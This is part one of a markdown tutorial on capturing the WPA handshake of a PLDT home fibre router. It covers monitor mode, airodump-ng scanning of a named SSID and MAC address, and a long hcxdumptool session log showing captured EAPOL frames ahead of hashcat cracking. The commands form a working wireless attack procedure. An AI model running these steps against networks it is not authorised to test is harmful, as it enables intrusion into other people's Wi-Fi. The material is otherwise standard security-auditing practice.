### How to Hack PLDTWIFI Default Credetials (PART1)

	Author's Warning:
	- This video is for EDUCATIONAL PURPOSES ONLY. I own all equipment used for this demonstration. Only use the tools demonstrated in this video against networks you have permission to attack.

#### Requirements

1. TPLink AC600 (or any relevant wifi adapter) that can enable monitor mode.
	1. Other wifi adapters include: Alfa AWUS036ACH, Panda PAU05
	   

![](../img/Pasted%20image%2020220823192852.png)

2. Kali Linux Distro, or any other Linux Distro
3. Windows powershell


#### Steps

1. Open Linux OS in a virtual machine setting (using vmware, or  virtualbox). Then login to the machine and spawn a terminal, like so:
   

![](../img/Pasted%20image%2020220823192907.png)


![](../img/Pasted%20image%2020220823192919.png)

2. Check if the wifi adapter is connected and enabled in the machine. If you are using vmware workstation, you may check the status of the wifi adapter below, and status must be connected:

![](../img/Pasted%20image%2020220823192932.png)

3. Check if the wireless interface is up. On the terminal, type `lsusb`  and `iwconfig` to verify, like so:

![](../img/Pasted%20image%2020220823193002.png)
	As you can see, in our case, the bus 001 device is registered as Realtek RTL8811AU [Archer T2U Nano]. Further verification on iwconfig shows wlan0 interface with Mode: Managed.

4. Prepare the tools needed for the attack. The tools are the following:
	1. Check if repositories are updated. Perform `sudo apt-get update`
	 ![](../img/Pasted%20image%2020220823193018.png)
	2. Perform repositories upgrade. Use `sudo apt-get upgrade`
	   ![](../img/Pasted%20image%2020220823193041.png)
	3. airmon-ng - this is natively installed on Kali. Otherwise, perform `sudo apt-get install airmon-ng` to install the package.
	   
	4. hcxdumptool - perform `sudo apt-get install hcxdumptool`, like so. If there is no repository, you can perform `git clone https://github.com/ZerBea/hcxdumptool`
	   ![](../img/Pasted%20image%2020220823193106.png)
	5. hcxpcapngtool - perform `sudo apt-get install hcxpcapngtool`, like so. If there is no repository, you can perform `git clone https://github.com/ZerBea/hcxtools`
	   ![](../img/Pasted%20image%2020220823193127.png)
	6. airodump-ng - this is also native in Kali, however if you dont have this repository, perform `sudo apt-get install airodump-ng`
	7. hashcat - perform `sudo apt-get install hashcat` on Linux and go to https://hashcat.net/hashcat/ on Windows.
	   
	   ![](../img/Pasted%20image%2020220823193147.png)
5. Enable Wifi adapter in Monitor Mode. You can do this by performing `sudo airmon-ng check kill` first, then `sudo airmon-ng start wlan0`, like so
	   ![](../img/Pasted%20image%2020220823193204.png)
	   As you can see, after performing the syntax, upon performing `iwconfig`, the mode changed from "Managed" to "Monitor".

6. Perform reconaissance. Use the syntax `sudo airodump-ng wlan0` to scan for other wireless adapters:

	Another helpful tip: you can use `sudo airodump-ng wlan0 --band a` to scan 5GHz wifi adapters:
	
	![](../img/Pasted%20image%2020220823193227.png)

	The SSID that we will be attacking: PLDTHOMEFIBR5GBCRxh.
	Also, take note of the mac address. We will be using this later.

7. Perform further enumeration to filter only the mac address of the attacking router. Use `sudo airodump-ng wlan0 --band a -d 24:91:BB:40:62:44`, like so. Dont quit the monitoring:
   ![](../img/Pasted%20image%2020220823193242.png)
   Take note of the channel (CH) number, we will be using it later.
8. Open up another terminal. Then use the syntax `sudo hcxdumptool -i wlan0 -o test.pcapng --enable_status=1 -c 149`
   Where: 
	   -i = interface
	   -o = output file
	   --enable_status = filter only the needed protocol (1 is used for PKMID+EAPOL)
	   -c = channel
Once performed, wait patiently until you can see an out of the blue notification like this:

`07:06:28 5745/149 a2d5ba6cef07 2491bb406244 PLDTHOMEFIBR5GBCRxh [EAPOL:M2M3 EAPOLTIME:7498 RC:2 KDV:2]

If you get it, you have now captured the password hash of the attacking wifi adapter!

```
──(kali㉿kali)-[~]
└─$ sudo hcxdumptool -i wlan0 -o test.pcapng --enable_status=1 -c 149
[sudo] password for kali: 
initialization of hcxdumptool 6.2.6 (depending on the capabilities of the device, this may take some time)...
interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
PHYSICAL INTERFACE........: phy0
INTERFACE NAME............: wlan0
INTERFACE PROTOCOL........: unassociated
INTERFACE TX POWER........: 0 dBm (lowest value reported by the device)
INTERFACE HARDWARE MAC....: 14ebb6ce0279 (not used for the attack)
INTERFACE VIRTUAL MAC.....: 5a512829a09f (not used for the attack)
DRIVER....................: rtl88XXau
DRIVER VERSION............: 5.18.0-kali5-amd64
DRIVER FIRMWARE VERSION...: 
openSSL version...........: 1.0
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 1011112cbeb4 (BROADCAST WILDCARD used for the attack)
ACCESS POINT (ROGUE)......: 1011112cbeb5 (BROADCAST OPEN used for the attack)
ACCESS POINT (ROGUE)......: 1011112cbeb6 (used for the attack and incremented on every new client)
CLIENT (ROGUE)............: b025aa87c352
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 65134
ANONCE....................: 51a04fa9485a0fc4bc9ef7a2cc7687146476cfe354e02b804015a0cc37c90f97
SNONCE....................: 981d9b2fb4486c9c1b2d0215fe5c4c59b4b49f183ee225e71f3838ed433edd74

TIME     FREQ/CH  MAC_DEST     MAC_SOURCE   ESSID [FRAME TYPE]
07:05:54     ERROR: 1 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 530000000]
07:05:55     ERROR: 2 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 550000000]
07:05:56     ERROR: 3 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 552000000]
07:05:57     ERROR: 4 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 556000000]
07:05:58     ERROR: 5 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 558000000]
07:05:59     ERROR: 6 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 560000000]
07:06:00     ERROR: 7 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 562000000]
07:06:01     ERROR: 8 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 566000000]
07:06:02     ERROR: 9 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 568000000]
07:06:03     ERROR: 10 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 570000000]
07:06:05     ERROR: 11 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 576500000]
07:06:06     ERROR: 12 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 580500000]
07:06:07     ERROR: 13 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 582500000]
07:06:08     ERROR: 14 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 586500000]
07:06:09     ERROR: 15 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 518000000]
07:06:10     ERROR: 16 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 520000000]
07:06:11     ERROR: 17 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 522000000]
07:06:12     ERROR: 18 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 524000000]
07:06:13     ERROR: 19 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 526000000]
07:06:14     ERROR: 20 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 528000000]
07:06:15     ERROR: 21 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 530000000]
07:06:16     ERROR: 22 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 550000000]
07:06:17     ERROR: 23 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 552000000]
07:06:18     ERROR: 24 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 554000000]
07:06:19     ERROR: 25 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 556000000]
07:06:20     ERROR: 26 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 558000000]
07:06:21     ERROR: 27 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 560000000]
07:06:22     ERROR: 28 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 564000000]
07:06:23     ERROR: 29 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 566000000]
07:06:24     ERROR: 30 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 568000000]
07:06:25     ERROR: 31 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 570000000]
07:06:26     ERROR: 32 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 572000000]
07:06:28     ERROR: 33 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 578500000]
07:06:28 5745/149 a2d5ba6cef07 2491bb406244 PLDTHOMEFIBR5GBCRxh [EAPOL:M1M2 EAPOLTIME:4275 RC:1 KDV:2]
07:06:28 5745/149 a2d5ba6cef07 2491bb406244 PLDTHOMEFIBR5GBCRxh [EAPOL:M2M3 EAPOLTIME:7498 RC:2 KDV:2]
07:06:28 5745/149 a2d5ba6cef07 2491bb406244 PLDTHOMEFIBR5GBCRxh [EAPOL:M3M4ZEROED EAPOLTIME:62 RC:2 KDV:2]
07:06:29     ERROR: 34 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 580500000]
07:06:30     ERROR: 35 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 582500000]
07:06:31     ERROR: 36 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 586500000]
07:06:32     ERROR: 37 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 520000000]
07:06:33     ERROR: 38 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 522000000]
07:06:34     ERROR: 39 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 524000000]
07:06:35     ERROR: 40 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 528000000]
07:06:36     ERROR: 41 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 530000000]
07:06:37     ERROR: 42 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 550000000]
07:06:38     ERROR: 43 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 552000000]
07:06:39     ERROR: 44 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 554000000]
07:06:40     ERROR: 45 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 558000000]
07:06:41     ERROR: 46 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 560000000]
07:06:42     ERROR: 47 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 564000000]
07:06:43     ERROR: 48 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 568000000]
07:06:44     ERROR: 49 [INTERFACE IS NOT ON EXPECTED CHANNEL, EXPECTED: 574500000, DETECTED: 570000000]
^C
terminating...
49 driver errors encountered
                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 

```

